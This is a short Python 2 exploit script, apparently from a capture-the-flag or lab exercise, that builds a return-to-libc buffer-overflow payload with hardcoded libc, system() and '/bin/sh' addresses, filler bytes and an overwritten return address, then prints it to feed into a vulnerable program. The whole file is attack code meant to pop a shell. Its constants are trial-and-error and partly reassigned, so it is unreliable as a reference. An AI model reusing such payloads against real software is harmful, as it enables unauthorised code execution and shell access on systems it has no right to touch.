import struct, sys

LIBC = 0x7fffff030000
BINSH = 0x18cd17
########0x7FFFFF1BCD17
SYSTEM = 0x13e65
SYS = 0x7FFFFF043E65

#SYS1 = 0x00007FFF
#SYS2 = 0xFF043E65
SYS1 = 0x00007FFF
SYS2 = 0xFF075390

CALL = LIBC + BINSH
CALL1 = 0x00007FFF
CALL2 = 0xFF1BCD17

CALL2 = CALL2 + 0x3152B
CALL2 = hex(CALL2)

CALL2 = 0xff1EE242
#print CALL2
def ret_alpha():
	r = ""
	while (len(r) < 1024):
		r += "\x00\x00\x00\x00"
	return r

def pad(s):
	r = ret_alpha()
	return s + r

cmd = ""
cmd += "yes "
cmd += "\x01\x00\x00\x00" * 50 # SIGTRAP
cmd += "\x02\x00\x00\x00" * 50 # SIGTRAP
cmd += "\x03\x00\x00\x00" * 50 # SIGTRAP
cmd += "\x04\x00\x00\x00" * 50 # SIGTRAP
cmd += "\xCC\xCC\xCC\xCC" * 10 # SIGTRAP
cmd += "\x05\x00\x00\x00" * 50 # SIGTRAP
cmd += "\x06\x00\x00\x00" * 9 # SIGTRAP
cmd += "\x97\x09\x40\x00\x00\x00\x00\x00" * 2
cmd += struct.pack("I", SYS2)
cmd += struct.pack("I", SYS1)
cmd += "AAAABBBB"
cmd += struct.pack("I", CALL2)
cmd += struct.pack("I", CALL1)
cmd += "\x00\x00\x00\x00" * (1024 - len(cmd))

cmd2 = ""
cmd2 += "yes "
cmd2 += "\xCC\xCC\xCC\xCC" * 1020 # SIGTRAP

print pad(cmd + "\n")
print cmd2 + "\n"
